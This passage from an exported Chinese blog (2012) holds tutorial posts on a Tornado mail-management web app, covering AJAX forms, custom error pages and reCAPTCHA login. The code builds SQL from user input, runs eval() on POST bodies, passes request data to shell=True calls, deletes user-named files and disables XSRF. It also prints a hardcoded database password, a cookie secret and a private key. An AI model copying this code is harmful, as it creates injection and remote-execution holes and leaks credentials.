MyRequestHandler(RequestHandler): #主要是去掉了xsrf的验证，因为我有一些url是给客户端post数据回来用的，如果需要xsrf验证很麻烦（只是post数据，没有登录）</p>\n\n<p>    def check_xsrf_cookie(self):\n        pass</p>\n\n<p>class RootHandler(RequestHandler): #当访问根目录触发</p>\n\n<p>    @asynchronous\n    def get(self):  #访问根目录的请求会被引导至login.html文件，上面包含需要登录的帐号，密码以及验证框，输入完成点击登录\n        self.render(\"static/login.html\")</p>\n\n<p>class HomeHandler(BaseHandler): #当用户登录被验证通过跳转到url的http://xxx/home</p>\n\n<p>    @asynchronous\n    def get(self):\n        self.check_user() #跳转到home前还是要验证用户\n        self.render(\"static/home.html\")</p>\n\n<p>class MysqlHander:  #处理数据库操作，使用tornado自带的database，当然也可以使用其他的，比如sqlalchemy</p>\n\n<p>    def __init__(self):\n        self.db = tornado.database.Connection(\"localhost\", \\\n                  \"mail\", \"testuser\", \"test623\")  </p>\n\n<p>    def delete(self, table):\n        self.db.execute(\"drop table %s\" % table)</p>\n\n<p>   def login(self, name): #验证登录用户是否在数据库中记录\n        if self.db.execute_rowcount(\"select * from user where User = '%s'\" % name) == 1:\n            return 1\n        else:\n            return 0\n    def passwd(self,passwd): #验证用户输入的密码是否正确\n        if self.db.execute_rowcount(\"select * from user where Passwd = '%s'\" % passwd) == 1:\n            return 1\n        else:\n            return 0</p>\n\n<p>    def update(self, table, dict): #修改table的数据\n        for i in dict.keys():\n            self.db.execute(\"UPDATE %s SET Sended = %d WHERE Email = '%s'\" % (table,dict[i],i)) \n    def taprint(self,table,flag=1,send=6):  #返回一个字符串，包含符合要求的条目结果，这个会传给js格式化\n        str = ''\n        for i in self.db.query(\"select * from %s where Flag = %d and Sended !=%d\" % (table,flag,send)):\n            str+='%s,%s,' % (i['Email'],i['Sended'])\n        return str[:-1] \n    def gettotal(self,table,flag=0):\n        count = self.db.execute_rowcount(\"select * from %s\" % table)\n        if not flag:\n            flagcount = self.db.execute_rowcount(\"select * from %s where Flag =1\" % table)\n            send={}\n            for i in range(6):\n                data = self.db.execute_rowcount(\"select * from %s where Flag =1 and Sended =%d\" % (table,i))\n                send[i]=data\n            return count,flagcount,send\n        else:\n            return count</p>\n\n<p>    def getdb(self,table):\n        str = ''\n        for i in self.db.query(\"select Email from %s\" % table):\n            str+=i['Email']+','\n        return str[:-1]</p>\n\n<p>    def check(self,table):\n        flag =0\n        for i in self.db.query(\"check table %s\" % table):\n            if i['Msg_type']=='status' and i['Msg_text']=='OK':\n                flag =1\n        return flag \n    def domain(self,table,domain):\n        return self.db.execute_rowcount(\"select * from %s where Email REGEXP '^.*@%s$'\" %(table,domain)) #正则匹配</p>\n\n<p>class UploadDbCheckHandler(BaseHandler):  #提供数据库的table检查和页面显示\n    @asynchronous\n    def get(self, id): #id表示数据库table的名字\n        self.check_user()\n        if id == '':\n            err(self,\"Please use the correct address\") #当没有输入的时候 触发报错\n            return -1\n        try:\n            db = MysqlHander()\n            data = db.getdb(id) \n            self.render(\"static/print.html\", num='1', str=data)  #通过print页面展示\n        except:\n           log(self, \"Database Error!\") </p>\n\n<p>class WebgetHandler(BaseHandler): \n    @asynchronous\n    def get(self, id):\n        self.check_user()\n        try:\n            db = MysqlHander()\n            str = db.taprint(id)\n            self.render(\"static/print.html\", num='2', str=str)\n        except:\n            self.write(\"Don't have this table!\") </p>\n\n<p>class PostHandler(MyRequestHandler): #post方法的处理 \n    @asynchronous\n    def post(self):\n        sql = gymysql()\n        uri = self.request.body\n        try:\n            mydict= eval(base.decode(uri, 'fmT0,magsqne31t')) #在这里我把数据进行了加密（使用自定义base模块），这里解密\n        except SyntaxError:\n            return -1\n        for key in mydict.keys():\n            for i in mydict[key].keys():\n                sql.update(key, i, mydict[key][i])\n        self.write(\"chenggong\")  #告诉客户端post数据完成 </p>\n\n<p>class DomainHandler(BaseHandler): \n    @asynchronous\n    def get(self, id):\n        self.check_user()\n        db = MysqlHander()\n        item = []\n        item2 = ''\n        try:\n            total = db.gettotal(id, flag=1)\n            for i in ['qq.com', '126.com', '163.com', '163.net', 'sina.com',\\\n                  'sina.com.cn', 'sohu.com', 'gmail.com', 'yahoo.com',\\\n                  'yahoo.com.cn', 'live.com', 'hotmail.com']:\n                num = int(db.domain(id, i))\n                item.append('%s rate:%6.2f%s' % (i, num/total*100, '%'))\n                t = total - num\n                dat = i + '@' + str(num)\n                item2 += dat + ','\n            dat = 'Other'+'@'+str(t)\n            item2 += dat\n            call('python chart2.py %s' % item2, shell=True)\n            title = '%s Table Statistics' % id\n            self.render(\"static/total.html\", title=title, ontitle=title, items=item)\n        except:\n            raise\n            self.write(\"Don't have this table!\")</p>\n\n<p>class WebHandler(BaseHandler): \n    @asynchronous\n    def get(self, id):\n        self.check_user()\n        try:\n            db = MysqlHander()\n            total = db.gettotal(id)\n            totalmail = total[0]\n            sendedmail = total[1]\n            if sendedmail==0:\n                sendedmail=1\n            items = [] \n            item2 = ''\n            items.append(\"Total Mails:%d\" % totalmail)\n            items.append(\"Process Mails:%d\" % sendedmail)\n            items.append(\"Success Send Mails:%d  Send success rate:%6.2f\" \\\n                         % (total[2][1],total[2][1]/sendedmail))\n            item2+='Success@'+str(total[2][1]) + ','\n            items.append(\"Deferred Send Mails:%d  Send deferred rate:%6.2f\" \\\n                         % (total[2][2],total[2][2]/sendedmail))\n            item2+='Deferred@'+str(total[2][2]) + ','\n            items.append(\"Bounced Send Mails:%d  Send bounced rate:%6.2f\" \\\n                         % (total[2][3],total[2][3]/sendedmail))\n            item2+='Bounced@'+str(total[2][3]) + ','\n            items.append(\"Deferral Send Mails:%d  Send deferral rate:%6.2f\"\\\n                         % (total[2][4],total[2][4]/sendedmail))\n            item2+='Deferral@'+str(total[2][4]) + ',' \n            items.append(\"Reject Send Mails:%d  Send reject rate:%6.2f\"\\\n                         % (total[2][5],total[2][5]/sendedmail))\n            item2+='Reject@' + str(total[2][5])\n            title = '%s Mail Statistics' % id\n            call('python chart2.py %s' % item2, shell=True) #这个chart.py是pychat模块，画图类，生成一个图表 可能更加直观。\n                                                         #但是我使用import chart时候没有起效果，所以将数据作为命令参数方式直接执行脚本以\n                                                         #实现每次先更新图像，再展示展示html\n            self.render(\"static/total.html\", title=title, ontitle=title, items=items)\n        except:\n            raise\n            self.write(\"Don't have this table!\")</p>\n\n<p>class DeleteHandler(MyRequestHandler): #一个删除的处理</p>\n\n<p>    def get_argument(self, name, strip=True): \n        default =[]\n        args = self.get_arguments(name, strip=strip)\n        if not args:\n            return default\n        return args[-1] \n    @asynchronous\n    def post(self):\n        try:\n            data = self.get_argument(\"delete\")\n        except:\n            err(self, \"Please enter the information you want to delete !\")\n            return -1\n        if self.get_argument(\"opert\"):  #当post返回的参数包含opert，删掉数据库table\n            d =MysqlHander()\n            if not d.check(data):  #验证是否存在这个table\n                err(self, \"Don't have this table!\")\n                return -1\n            try:\n                d.delete(data)\n            except:\n                err(self, \"Database Error!\")\n            log(self,\"Table has been deleted!\") #跳转到成功页面</p>\n\n<p>        if self.get_argument(\"operf\"):\n            try:\n                os.remove(\"uphtml/\"+ data)  #参数包含operf，删除这个文件\n            except:\n                err(self, \"Error!\")\n                return -1\n            log(self, \"Html File has been deleted!\") </p>\n\n<p>class LoginHandler(BaseHandler): #登录处理\n    @asynchronous\n    def post(self):\n        if not self.request.headers.get(\"Cookie\"): #验证浏览器是否支持cookie\n            self.write(\"Does not support Cookie!\")\n        uri = self.request.body\n        mydict = {}\n        for i in uri.split('&amp;'):\n            data = i.split('=')\n            if data[0] =='login':\n                data[1] = urllib2.unquote(urllib2.unquote(urllib2.unquote(data[1])))  #这个一直没修改，就是把页面url解码\n            mydict[data[0]] = data[1]\n        db = MysqlHander()\n        for i in ['login', 'passwd']:  #根据用户名和密码双重验证，和一起验证比，输出的警告不同：会明确的告诉你是用户名错误还是密码错误\n            flag = getattr(db, i)(mydict[i])\n            if not flag:\n                self.write(\"%s error!\" % i)\n                return -1\n        remote_ip = self.request.remote_ip\n        challenge = self.get_argument('recaptcha_challenge_field', None)\n        response =  self.get_argument('recaptcha_response_field', None)\n        rsp = captcha.check_google_captcha(self,remote_ip,challenge,response)\n        if not rsp.is_valid:  #以上的这些都是验证图片来验证输入字符是不是图片上面的字符\n             self.write('Verification code error!')\n             return -1\n        self.set_secure_cookie(\"user\", mydict['login'])\n        self.write(\"Login Success\") </p>\n\n<p>class CatchHandler(MyRequestHandler):  #这是一个远程操作的处理，根据参数，对一些可以直接ssh信任登陆的机器执行一些操作（使用paramiko）\n    @asynchronous\n    def post(self):\n        import ConfigParser\n        uri = self.request.body\n        num =  int(uri.split('=')[1])\n        conf = ConfigParser.ConfigParser()\n        conf.read('config.interval') \n        cur_num = conf.getint(\"config\",\"SendInterval\")\n        if cur_num == num:\n            self.write('The current interval has been %d' % num)\n            return -1\n        else:\n            conf.set(\"config\", \"SendInterval\",num)\n        conf.write(open(\"config.interval\", \"w\")) \n        data = call('sh deploy.sh config.interval &gt; /dev/null 2&gt;&amp;1', shell=True)\n        if data:\n            self.write('ssh Connect to the server error!')\n        import paramiko\n        for i in range(12,26):\n            ssh = paramiko.SSHClient()\n            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n            try:\n                ssh.connect('mta%d' % i, 61012, timeout=10)\n            except:\n                continue\n            ssh.exec_command(\"kill -9 `ps -ef |grep Re|grep -v grep |awk '{print $2}'`\")\n            ssh.exec_command(\"kill -9 `ps -ef |grep eventhandler|grep -v grep |awk '{print $2}'`\")\n            ssh.exec_command(\"python /home/dongwm/RevSocket.py\")\n            #ssh.exec_command(\"if [ `ps -ef |grep -v grep |grep RevS|wc -l` == 0 ]; then python /home/dongwm/RevSocket.py ;fi\")\n            ssh.close()\n        for i in range(1,6):\n            ssh = paramiko.SSHClient()\n            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n            try:\n                ssh.connect('cmta%d' % i, 22, timeout=10)\n            except:\n                continue\n            ssh.exec_command(\"kill -9 `ps -ef |grep Re|grep -v grep |awk '{print $2}'`\")\n            ssh.exec_command(\"kill -9 `ps -ef |grep eventhandler|grep -v grep |awk '{print $2}'`\")</p>\n\n<p>            ssh.exec_command(\"python /home/dongwm/RevSocket.py\")\n            #ssh.exec_command(\"if [ `ps -ef |grep -v grep |grep RevS|wc -l` == 0 ]; then python /home/dongwm/RevSocket.py ;fi\")\n            ssh.close()\n        self.write('Operation is complete!')  #这里是ajax的，操作完成，前台弹出alert框</p>\n\n<p>class UploadHtmlHandler(MyRequestHandler): #上传文件处理\n    @asynchronous\n    def post(self):\n        try:\n            try:\n                myfile = self.request.files['myfile']\n            except:\n                err(self, \"Please enter the file's address!\")\n                return -1\n            for f in myfile:\n                hz = os.path.splitext(f['filename'])[1][1:]\n                if  hz != 'html':\n                    err(self,\"Temporarily only to receive the  formats of the html file!\")\n                    return -1\n                src = \"uphtml/\" + f['filename']\n                with open(src, 'w+') as c:\n                    c.write(f['body'])\n                view(self, f['filename'], 'HTMLButton')\n        except:\n            err(self, \"file upload ERROR! try again\")\n            return -1 </p>\n\n<p>class SendPostHandler(MyRequestHandler): \n    @asynchronous\n    def post(self):\n        uri = self.request.body\n        sql = MysqlHander()\n        mydict = {}\n        for i in uri.split('&amp;'):\n            data = i.split('=')\n            mydict[data[0]]=data[1]\n        htmlpath = 'uphtml/' + mydict['html']\n        if not os.path.exists(htmlpath):\n            self.write('This html file does not exist!')\n            return -1\n        #if int(sql.gettotal(mydict['table'], flag=1)) &lt; int(mydict['sendnum']):\n        #    mydict['sendnum'] = sql.gettotal(mydict['table'], flag=1)\n        #elif int(mydict['sendnum']) == 0:\n        #    mydict['sendnum'] = sql.gettotal(mydict['table'], flag=1)\n        if not sql.check(mydict['table']):\n            self.write('This table does not exist!')\n            return -1\n        m = re.compile('^\\w+([-+.]\\w+)*@(ailll|dongwm).com') \n        sender = urllib2.unquote(mydict['sender'])\n        if not m.match(sender):\n            self.write('E-mail address only to support ailll.com or dongwm.com')\n            return -1\n        senderid = urllib2.unquote(mydict['senderid'])\n        head = urllib2.unquote(mydict['head']) \n        import Main\n        d = Main.Send()\n        d.General('mail', mydict['table'], sender, head, senderid, mydict['html']) \n        self.write('Sender Done!') </p>\n\n<p>class ChoosetHandler(MyRequestHandler): #一个包含选择的处理 \n    @asynchronous\n    def post(self):\n        try:\n            ch = int(self.get_argument(\"ch\"))\n        except:\n            err(self, \"Please choose how!\")\n            return -1\n        try:\n            src = self.get_argument(\"src\")\n        except:\n            err(self, \"error!\")\n            return -1\n        if ch == 2:  #选择2  直接创建table\n           createt(self, src) \n        elif ch == 1:  #选择1 删除table，在重新创建：相当于覆盖\n            d = MysqlHander()\n            d.delete(os.path.splitext(os.path.basename(src))[0])\n            createt(self, src)\n        else:\n           err(self, \"Cancel!\")  </p>\n\n<p>class RadomDbHandler(MyRequestHandler):  \n    @asynchronous\n    def post(self):\n        num = int(self.get_argument(\"num\")) \n        import rt\n        rt.work(self, num) </p>\n\n<p>class UploadDbHandler(MyRequestHandler):  \n    def choose(self,flag,table):\n       if flag ==1:\n           d = MysqlHander()\n           d.delete(table)  \n    @asynchronous\n    def post(self):\n        try:\n            choose = int(self.get_argument(\"choose\"))  #这里是radio方式的选择，单选。但是不选会异常处理\n        except:\n            err(self, \"Please choose whether or not to create a database!\") \n            return -1\n        try:\n            myfile = self.request.files['myfile']\n        except:\n            err(self, \"Please enter the file's address!\")\n            return -1\n        if choose:\n            try:\n                for f in myfile:\n                    hz = os.path.splitext(f['filename'])[1][1:]\n                    if  (hz != 'txt') and (hz != 'xls') and (hz !='csv'): \n                        err(self,\"Temporarily only to receive the three \\\n                        formats of the csv / txt / xls file!\")\n                        return -1\n                    src = \"upload/\" + f['filename'] \n                    with open(src, 'w+') as c:\n                        c.write(f['body'])\n            except:\n                err(self, \"file upload ERROR! try again\")\n                return -1\n            sql = MysqlHander()\n            table = os.path.splitext(os.path.basename(src))[0]\n            check = sql.check(table)\n            if check:\n                self.render(\"static/choose.html\", src=src)\n            else:\n                createt(self, src)\n        else:\n            log(self,\"no create!\")  \n    def data(self):\n       log(self,\"Has been uploaded files:\")\n       for root, dirs, files in os.walk('./upload'):\n            log(self, \"%s\" % files) </p>\n\n<p>class Application(tornado.web.Application): #子类化Application \n    def __init__(self):\n        settings = {\n        \"static_path\": os.path.join(os.path.dirname(__file__), \"static\"),\n        \"upload_path\": os.path.join(os.path.dirname(__file__), \"uphtml\"),\n        \"cookie_secret\":\"24oETzKXQAGaYdkL5gEmGeJJFuYh7EQnp2XdTP1o/Vo=\", \n        \"login_url\": \"/login\",\n        \"xsrf_cookies\": True,\n       # \"autoescape\":None,\n         }\n        handlers = [\n        (r\"/post_path\", PostHandler),\n        (r\"/sendinterval\", CatchHandler),\n        (r\"/uploadt\", UploadDbHandler),\n        (r\"/uploadrt\", RadomDbHandler),\n        (r\"/uploadh\", UploadHtmlHandler),\n        (r\"/chooset\", ChoosetHandler),\n        (r\"/del\", DeleteHandler),\n        (r\"/mail/(.*)\", WebHandler),\n        (r\"/domain/(.*)\", DomainHandler),\n        (r\"/check/(.*)\", WebgetHandler),\n        (r\"/home\",HomeHandler),\n        (r\"/\",RootHandler),\n        (r\"/login\", LoginHandler),\n        (r\"/logout\", LogoutHandler),\n        (r\"/path\", SendPostHandler),\n        (r\"/db/(.*)\", UploadDbCheckHandler),\n        (r\"/uphtml/(.*)\", StaticFileHandler,dict(path=settings['upload_path'])),\n         ]\n        tornado.web.Application.__init__(self, handlers, **settings) </p>\n\n<p>if __name__ == \"__main__\":\n    http_server = tornado.httpserver.HTTPServer(Application(), ssl_options={ #指定使用ssl加密，具体加密方法以及自己的参考其他资料\n           \"certfile\": os.path.join(os.path.abspath(\".\"), \"server.crt\"),\n           \"keyfile\": os.path.join(os.path.abspath(\".\"), \"server.key\"),\n       })\n    http_server.listen(443)\n    loop = tornado.ioloop.IOLoop.instance()\n #   tornado.autoreload.start(loop)\n    loop.start()\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "March",
      "day": "23"
    }
  },
  {
    "id": 137,
    "title": "tornado应用例子(二)：使用ajax（jquery）通过前台和后台交互",
    "category": "ajax",
    "tags": [
      "ajax",
      "jquery"
    ],
    "url": "/archives/tornadoyingyongliziershiyongajaxjquerytongguoqiantaihehoutaijiaohu/",
    "content": "<p>前言：在实际使用中肯定出现在web页面输入一些数据然后把数据传送到后台（tornado），执行完毕后再从后台把结果返回到web前台，其中也安排一些异常处理，比如数据在后台不存在，会进行提示（异步），上一个例子主要把html文件写到了python脚本，本例子是一个html＋tornado类</p>\n\n<p><pre class=\"sh_html4strict\">\n&lt;html&gt;\n&lt;head&gt;\n&lt;script src=\"static/jquery.js\" type=\"text/javascript\"&gt;&lt;/script&gt;   #我这里使用了jquery封装\n&lt;script type=\"text/javascript\"&gt;\npreAllow = true;   #定义一个变量，主要是为了防止恶刷，也是为了防止重复提交，在返回结果之前是不能点击的\n$(function()\n        {\n$(\"#AjaxGet\").click(function(event)   #使用jquery封装js\n            {\n    if(preAllow){   \n    preAllow=false;\n    var flag =1  #定义一个变量，当下面的一些检查发现问题会置0，这样就不会发送post请求了\n    var htmlElement = encodeURI(encodeURI($(\"#myhtml\").val()));  #使用jquery获取DOM \n    if (/(\\w+)\\.html/.exec(htmlElement) == null||htmlElement==\"\")  #使用js的正则匹配判断格式不符合  或者  为空  都会alert\n    {\n    alert(\"请输入正确的html文件\");\n    flag=0;\n    }\n    var tableElement = encodeURI(encodeURI($(\"#mytable\").val()));\n    if (tableElement==\"\")\n    {\n    alert(\"请输入数据库表名\");\n    flag=0;\n    }\n    var senderElement = encodeURI(encodeURI($(\"#sender\").val()));\n    if (/(\\w+)\\@(.*)/.exec(senderElement) == null||senderElement==\"\")\n    {\n    alert(\"请输入正确的Email地址\");\n    flag=0;\n    }\n    var headElement = $(\"#myhead\").val();   #这里的jquery获取DOM，但是为了解析方便我没有编码url\n    if (headElement==\"\")\n    {\n    alert(\"请输入发送邮件的head\");\n    flag=0;\n    }\n    var senderidElement = $(\"#sender_id\").val();\n    if (senderidElement==\"\")\n    {\n    alert(\"请输入发送邮件标识\");\n    flag=0;\n    }\n    if(flag){\n    $.ajax({   #使用了jquery的ajax，因为我需要回调没有使用$.get\n   type: \"POST\",  #调用类型\n   url: \"/path\",  #调用的url地址\n   data: {\"html\":htmlElement,\"table\":tableElement,\"sender\":senderElement,\"head\":headElement,\"senderid\":senderidElement},  #传送的dict数据\n   success: function(data){  #回调函数，alert返回结果\n   alert(decodeURI(data));\n   preAllow = true;\n}</p>\n\n<p>\t});    \n}}\nelse {alert(\"已经发送了!\");}   #执行中再点击，弹出警告！\n});\n})\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;    \n    &lt;form&gt;\n    &lt;label for=filename&gt;调用的html文件名&lt;/label&gt;   #充分使用html5\n    &lt;input id=myhtml type=text required /&gt;&lt;/br&gt;\n    &lt;label for=tablename&gt;调用数据库表名&lt;/label&gt;\n    &lt;input id=mytable  type=text required /&gt;&lt;/br&gt;\n    &lt;label for=email&gt;发送者邮件地址&lt;/label&gt;\n    &lt;input id=sender  type=email required /&gt;&lt;/br&gt;\n    &lt;label for=emailhead&gt;邮件标题&lt;/label&gt;\n    &lt;input id=myhead  type=text required /&gt;&lt;/br&gt;\n    &lt;label for=emailid&gt;邮件发送人标识&lt;/label&gt;\n    &lt;input id=sender_id  type=text required /&gt;&lt;/br&gt;\n    &lt;/form&gt;\n    &lt;button id=\"AjaxGet\"&gt;使用执行&lt;/button&gt;&lt;br /&gt;\n    &lt;div id=\"serverResponse\"&gt;&lt;/div&gt;  #暂时没用\n&lt;/body&gt;\n&lt;/html&gt;\n</pre></p>\n\n<p><pre class=\"sh_python\">\nclass SendPostHandler(MyRequestHandler):\n    def post(self):\n        uri = self.request.body\n        sql = MysqlHander()\n        mydict = {}\n        for i in uri.split('&amp;'):\n            data = i.split('=')\n            mydict[data[0]]=data[1]\n        htmlpath = 'uphtml/' + mydict['html']\n        if not os.path.exists(htmlpath):\n            self.write('This html file does not exist!')\n            return -1\n        import Main\n        d = Main.Send()\n        d.General('mail',mydict['table'],sender,head,senderid,mydict['html']) \n        time.sleep(10)\n        self.write('Sender Done!')\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "March",
      "day": "31"
    }
  },
  {
    "id": 138,
    "title": "tornado 404实现重定向页面",
    "category": "tornado",
    "tags": [
      "tornado404"
    ],
    "url": "/archives/tornado404shixianzhongdingxiangyemian/",
    "content": "<p>前言：不喜欢默认的404报错：404:Not Found，本来我可以在我程序里面对RequestHandler重定义，但是需要修改的比较多，因为我的服务器上面只跑我这一个程序，那么我直接去修改源码（/usr/local/lib/python2.6/site-packages/tornado-2.2-py2.6.egg/tornado）的ErrorHandler类（个人方法仅供参考，要是有更好的方法，欢迎留言<pre class=\"sh_python\">\nclass ErrorHandler(RequestHandler):  #大约1413行  这里主要是‘文件url的404’\n    \"\"\"Generates an error response with status_code for all requests.\"\"\"\n    def initialize(self, status_code):\n        self.set_status(status_code)</p>\n\n<p>    def prepare(self):\n#        raise HTTPError(self._status_code)   注释掉了这句\n        self.render(\"error.html\")   改成重定向到一个页面</p>\n\n<p> if not os.path.exists(abspath):   #大约1490行 这里主要是‘文件的404’\n            #raise HTTPError(404)\n            self.render(\"error.html\")\n            return -1</p>\n\n<p> </pre>\nerror.html内容  #这个文件放在tornado模块的路径下\n<pre class=\"sh_html4strict\">\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;html lang=\"zh-CN\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\" /&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" /&gt;\n&lt;title&gt;dongwm.com 404报错页面&lt;/title&gt;\n&lt;meta name=\"robots\" content=\"noindex, nofollow\" /&gt;\n&lt;link href=\"{{static_url(\"dict.css\")}}\" rel=\"stylesheet\" type=\"text/css\" /&gt;\t  #这里指定css放在网站程序的静态页面路径，而不是\n&lt;/head&gt;                                                 #在tornado源码目录下，使用这样的路径是为了无论在网站那一级目录都能找到这个css，要不然在跟目录下可以，其他子目录下就没有了\n\t&lt;body&gt;                                           #或者直接指定url 比如 http://127.0.0.1/static/dict.css\n\t\t&lt;div id=\"header\" class='headerPadding'&gt;\n\t\t&lt;/div&gt;\n\t\t&lt;div id=\"allframe\" class=\"width950\"&gt;\n\t\t\t&lt;div class=\"div404\"&gt;\n\t\t\t\t&lt;div class=\"div404wording\"&gt;\n\t\t\t\t\t&lt;a href=\"https://127.0.0.1\"&gt;首页&lt;/a&gt;\n\t\t\t\t\t&lt;br&gt;\n\t\t\t\t&lt;/div&gt;\n\t\t\t&lt;/div&gt;\n\t\t&lt;/div&gt;\n\t\t&lt;div id=\"bottom\"&gt;\n\t\t\t&lt;div class=\"width950\" align=\"center\"&gt;\n\t\t\t\t&lt;div class=\"copyright\"&gt;\n\t\t\t\t\tCopyright © 2012 dongwm.com&lt;/br&gt;\n\t\t\t\t\t&lt;br /&gt;版权所有\n\t\t\t\t&lt;/div&gt;\n\t\t\t&lt;/div&gt;\n\t\t&lt;/div&gt;\n\t&lt;/body&gt;\n&lt;/html&gt;\n</pre>\n&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "10"
    }
  },
  {
    "id": 139,
    "title": "tornado对http403，405重定向",
    "category": "tornado",
    "tags": [
      "tornado403",
      "tornado405"
    ],
    "url": "/archives/tornadoduihttp403405zhongdingxiang/",
    "content": "<p>前言：http403表示禁止访问，比如没有相应权限，比如它不是一个可以读的文件（目录）;http405表示资源被禁止，比如一个url要求你使用post方式访问，你直接打开网页用get方式就不可以</p>\n\n<p>修改 tornado源码web.py</p>\n\n<p><pre class=\"sh_python\">\nif not (abspath + os.path.sep).startswith(self.root): #大概1479行\n    #raise HTTPError(403, \"%s is not in root static directory\", path)\n    self.render(\"error403.html\")\n    return -1      </p>\n\n<p>if not os.path.isfile(abspath):   #大概1492\n    #raise HTTPError(403, \"%s is not a file\", path)\n    self.render(\"error403.html\")\n    return -1</p>\n\n<p>def get(self, *args, **kwargs):  #大概158行\n    self.render(\"error405.html\")\n    #raise HTTPError(405)</p>\n\n<p>注：不能在self.set_status根据code标识重定向（self._finished已经被设置了，会重复2次）\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "11"
    }
  },
  {
    "id": 140,
    "title": "使用Google Captcha作tornado网站的验证码",
    "category": "ajax",
    "tags": [
      "GoogleCaptcha",
      "recaptcha"
    ],
    "url": "/archives/shiyonggooglecaptchazuotornadowangzhandeyanzhengma/",
    "content": "<p>前言：为了防止恶意尝试破解密码，在用户注册和登录的时候都需要一个验证码，但是简单的验证码图片实在太好破解了，还是不安全，正好发现类似于google，yahoo等大网站的图片验证使用了这样的方式：</p>\n\n<p><img class=\"alignnone\" title=\"recaptcha\" src=\"https://developers.google.com/recaptcha/images/reCAPTCHA_Sample_White.png\" alt=\"\" width=\"322\" height=\"132\" /></p>\n\n<p>我不知道安全性怎么样，但是至少这样的网站在使用就能说明问题。</p>\n\n<p>，而且省去了自己研究复杂算法，自己画图，然后根据数据确定是不是正确验证，也省去了Captcha服务器，感谢google！</p>\n\n<p>网站上有一个例子,而且也有一个python模块：http://recaptcha.googlecode.com/svn/trunk/recaptcha-plugins/python ，和我的实现差不多</p>\n\n<p>1 captcha.py #recaptcha检查模块</p>\n\n<p><pre class=\"sh_python\">\nimport urllib,urllib2\nimport os\nGOOGLE_CAPTCHA_API = 'http://www.google.com/recaptcha/api/verify'\nclass RecaptchaResponse:\n    def __init__(self, is_valid, error_code=None):\n        self.is_valid = is_valid\n        self.error_code = error_code\ndef check_google_captcha(request,remote_ip,recaptcha_challenge_field,recaptcha_response_field):\n    if not (recaptcha_challenge_field and recaptcha_response_field):\n        return RecaptchaResponse (is_valid = False, error_code = 'incorrect-captcha-sol')\n    def encode_if_necessary(s):\n        if isinstance(s, unicode):\n            return s.encode('utf-8')\n        return s\n    params = urllib.urlencode ({\n            'privatekey': encode_if_necessary('6LfyINASAAcxzdUXc_f_kJ1ADSA6NfkU8ZoNgw_jl'),  #这里是我的私钥\n            'remoteip' :  encode_if_necessary(remote_ip), #远程主机ip\n            'challenge':  encode_if_necessary(recaptcha_challenge_field),\n            'response' :  encode_if_necessary(recaptcha_response_field),  #填入的数据\n            })\n    request = urllib2.Request(\n        url = GOOGLE_CAPTCHA_API,\n        data = params,\n        headers = {\n            \"Content-type\": \"application/x-www-form-urlencoded\",\n            \"User-agent\": \"reCAPTCHA Python\"\n            }\n        )\n    httpresp = urllib2.urlopen(request)\n    return_values = httpresp.read().splitlines();\n    httpresp.close();\n    return_code = return_values[0]\n    if (return_code == \"true\"):\n        return RecaptchaResponse(is_valid=True)\n    else:\n        return RecaptchaResponse(is_valid=False, error_code = return_values[1])\n</pre></p>\n\n<p>2 后台相关代码：</p>\n\n<p><pre class=\"sh_python\"></p>\n\n<p>import captcha\nremote_ip = self.request.remote_ip  #获取远程ip  这个和django，gae获取方式都不同\nchallenge = self.get_argument('recaptcha_challenge_field',None)\nresponse =  self.get_argument('recaptcha_response_field',None)\nrsp = captcha.check_google_captcha(self,remote_ip,challenge,response)\nif not rsp.is_valid:\nself.write('Verification code error!')\n             return -1\n</pre></p>\n\n<p>3 前台网页代码：</p>\n\n<p><pre class=\"sh_html4strict\">\n&lt;!DOCTYPE html&gt;\n&lt;head&gt;\n&lt;script src=\"static/jquery.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"http://www.google.com/recaptcha/api/js/recaptcha_ajax.js\"/&gt;&lt;/script&gt;  #引用google的js\n&lt;script type=\"text/javascript\" src=\"static/jquery.cookies.2.2.0.min.js\"&gt;&lt;/script&gt; \n&lt;script type=\"text/javascript\"&gt;</p>\n\n<p>$(document).ready(function(){\n    google_captcha('gcaptcha');\n});\nfunction google_captcha(element){\n    Recaptcha.create('6LfyINASAAsdddJhhV-ofP8nQ-sRsddup8AHSQHl',element,{   #输入公钥\n        theme: \"clean\",  #主题 一共四种\n        callback: Recaptcha.focus_response_field \n    });\n}\n$(function()\n        {\n$(\"#lg\").click(function(event)\n            {\n    var xsrf = $.cookies.get(\"_xsrf\");\n    var name = $(\"#zh\").val();\n    var loginElement = encodeURI(encodeURI($(\"#zh\").val()));\n    var passElement = encodeURI(encodeURI($(\"#ps\").val()));\n    var response = $(\"#recaptcha_response_field\").val();  #因为这里使用jquery的ajax，post的数据需要指定都取什么\n    var challenge = $(\"#recaptcha_challenge_field\").val(); \n    $.ajax({\n   type: \"POST\",\n   url: \"/login\",\n   data: {'login':loginElement,'passwd':passElement,'_xsrf':xsrf,'recaptcha_response_field':response,'recaptcha_challenge_field':challenge}, #数据包含这五种\n   success: function(data){\n   if (/Login Success/.exec(decodeURI(data)) == null)\n   {\n   alert(decodeURI(data));\n   Recaptcha.reload();   #假如有输入错误会弹窗警告，然后会重置验证码图片\n}\n   else {  window.location=\"/home\";\n   }}\n\t});    \n   $.cookies.set(\"name\",name);\n});\n})\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div id=\"login\"&gt;\n&lt;form class=\"login\" action=\"/login\" method=\"post\"&gt;\n{ % module xsrf_form_html() % } <!-- 这里我把%和{/}分开了-->\n&lt;input class=\"text\" type=\"text\" name=\"login\" id=\"zh\" spellcheck=\"false\" placeholder=\"帐 号\" autofocus tabindex=\"1\"&gt;\n&lt;input class=\"text\" type=\"password\" name=\"passwd\" id =\"ps\" placeholder=\"密 码\" 